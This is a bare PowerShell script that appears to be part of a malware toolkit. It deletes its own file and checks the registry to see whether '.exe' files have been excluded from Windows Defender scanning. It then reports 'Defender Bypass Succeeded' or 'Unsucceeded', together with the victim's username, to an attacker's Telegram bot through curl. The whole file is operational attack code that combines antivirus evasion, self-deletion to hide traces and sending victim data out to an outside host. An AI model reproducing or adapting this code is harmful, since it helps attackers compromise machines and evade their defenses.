<##>
$token = $args[0];
$chat_id = $args[1];

$filename = $MyInvocation.MyCommand.Definition.ToString();
Remove-Item -Path $filename -Force;

$valueExists = (Get-Item 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions\' -EA Ignore).Property -contains '.exe';
function Check{
    if($valueExists -eq $true){
        return "%E2%9C%94%20Defender%20Bypass%20Succeeded";
    }
    else{
        return "%E2%9D%8C%20Defender%20Bypass%20Unsucceeded";
    }
}

function Send_Message(){
    $url = "https://api.telegram.org/bot" + $token + "/sendMessage?text=" + $message + "%0A--$env:Username--&chat_id=" + $chat_id;
    cmd.exe /c curl `"$url`" -s -k;
}
$message = Check;
Send_Message;
